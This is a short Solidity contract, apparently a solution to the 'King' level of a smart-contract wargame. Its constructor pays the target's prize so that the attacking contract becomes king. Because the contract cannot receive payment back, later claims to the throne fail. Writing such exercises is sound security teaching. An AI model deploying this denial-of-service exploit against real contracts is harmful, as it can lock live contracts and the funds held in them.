// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract KingAttack {
    constructor(address payable _target) payable {
        (bool ok,) = _target.call{value: King(_target).prize()}("");
        require(ok, "Call failed");
    }
}
